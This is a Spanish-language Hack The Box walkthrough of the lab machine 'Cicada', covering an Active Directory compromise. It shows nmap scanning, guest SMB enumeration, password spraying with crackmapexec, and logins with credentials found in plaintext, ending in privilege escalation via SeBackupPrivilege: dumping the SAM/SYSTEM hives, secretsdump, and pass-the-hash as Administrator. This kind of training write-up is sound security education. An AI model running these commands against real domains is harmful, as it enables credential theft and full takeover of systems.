---
title: Cicada
parent: Easy
nav_order: 1
---

# Walkthrough — Cicada (Hack The Box)
{: .fs-9 }

> Walkthrough para la máquina *Cicada* de HTB, centrado en entorno Active Directory y escalada usando privilegios de backup.
{: .fs-6 .fw-300 }

---

![0](/assets/images/cicada/0.png)

## Escaneo inicial

He lanzado un escaneo completo de puertos TCP con Nmap sobre la IP 10.129.38.45 para identificar qué servicios están activos y accesibles en la máquina objetivo.

```bash
nmap -p- 10.129.38.45
```

![1](/assets/images/cicada/1.png)

---

Tras la primera enumeración realicé un escaneo más a fondo con Nmap usando `-sC -sV` sobre los puertos que ya tenía, para ver qué versiones de servicios hay y si se puede sacar algo más de info útil.

```bash
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,60688,60853 10.129.38.45
```

![2](/assets/images/cicada/2.png)

---

He visto que la máquina forma parte de un dominio llamado `cicada.htb`, y el controlador de dominio se llama `CICADA-DC.cicada.htb`, así que está claro que estoy frente a un entorno de Active Directory.

Lo siguiente que voy a hacer es añadir el dominio y el hostname al archivo `/etc/hosts` para poder resolverlos bien desde mi máquina, y luego empezaré a enumerar usuarios del dominio usando herramientas como crackmapexec, rpcclient o ldapsearch.

```bash
echo "10.129.38.45 cicada.htb" | sudo tee -a /etc/hosts
```

![3](/assets/images/cicada/3.png)

---

He probado acceso SMB con el usuario `guest` y he visto que puedo listar las comparticiones del servidor. Algunas de ellas, como `HR`, `IPC$`, `SYSVOL` y `NETLOGON`, me dan permisos de lectura. Lo siguiente que voy a hacer es conectarme a esas shares con `smbclient`.

![4](/assets/images/cicada/4.png)

---

Me he conectado a la carpeta compartida `HR` con `smbclient` y he encontrado un archivo llamado `Notice from HR.txt`.

```bash
smbclient \\10.129.38.45\HR
```

![5](/assets/images/cicada/5.png)

---

He descargado el archivo `Notice from HR.txt` y resulta ser una carta de bienvenida para nuevos empleados. Lo más interesante es que menciona una contraseña por defecto: `Cicada$M6Corpb*@Lp#nZp!8`.

![6](/assets/images/cicada/6.png)

---

He usado `lookupsid.py` con el usuario `guest` y me ha devuelto todos los usuarios del dominio. He sacado varias cuentas reales, y voy a probar si alguno sigue usando la contraseña por defecto encontrada.

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
```

![7](/assets/images/cicada/7.png)

---

Compruebo la contraseña por defecto con varios usuarios y he encontrado que `michael.wrightson` también la usa. Voy a probar si tiene acceso por WinRM para sacar shell.

```bash
crackmapexec smb 10.129.38.45 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --no-bruteforce
```

![8](/assets/images/cicada/8.png)

---

`michael.wrightson` no tiene acceso por WinRM, pero descubrí en la descripción del usuario `david.orelious` una contraseña en texto claro: `aRt$Lp#7t*VQ!3`. Voy a usarla para enumerar recursos compartidos.

```bash
crackmapexec smb 10.129.38.45 -u david.orelious -p 'aRt$Lp#7t*VQ!3'
```

![9](/assets/images/cicada/9.png)

---

```bash
smbclient -L \\10.129.38.45 -U 'david.orelious'
```

![10](/assets/images/cicada/10.png)

---

Me he conectado a la carpeta `DEV` con `david.orelious` y he encontrado un script de PowerShell llamado `Backup_script.ps1`. En este caso tiene información bastante interesante.

![11](/assets/images/cicada/11.png)

---

Esto ya va teniendo mejor pinta. Acabo de encontrar en el script de backup las credenciales de emily.oscars. Están en texto plano, así que voy a probar si me puedo autenticar con ellas por SMB o incluso sacar una shell remota por WinRM. Si tiene más privilegios, podría servirme para escalar.

![12](/assets/images/cicada/12.png)

---

Con esas credenciales he accedido al sistema:

```bash
evil-winrm -i 10.129.38.45 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

![13](/assets/images/cicada/13.png)

---

## Escalada de privilegios

El usuario `emily.oscars` tiene el privilegio `SeBackupPrivilege` activado. Voy a usarlo para volcar los archivos del registro y extraer hashes del sistema.

![14](/assets/images/cicada/14.png)

---

Desde la máquina víctima:

```powershell
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
download C:\Windows\Temp\SAM
download C:\Windows\Temp\SYSTEM
```

En la máquina atacante:

```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

![15](/assets/images/cicada/15.png)

![16](/assets/images/cicada/16.png)

---

Aunque no pude crackear la contraseña con john, he usado directamente el hash con evil-winrm para hacer un pass-the-hash. Me he conectado al servicio WinRM usando solo el hash, sin necesidad de conocer la contraseña en texto claro, y he obtenido una shell directamente como Administrator, con control total sobre la máquina.

```bash
evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
```

![17](/assets/images/cicada/17.png)

**Autor:** [gueco99](https://github.com/gueco99)  
🧠 Hack the Box – *Cicada* (Easy)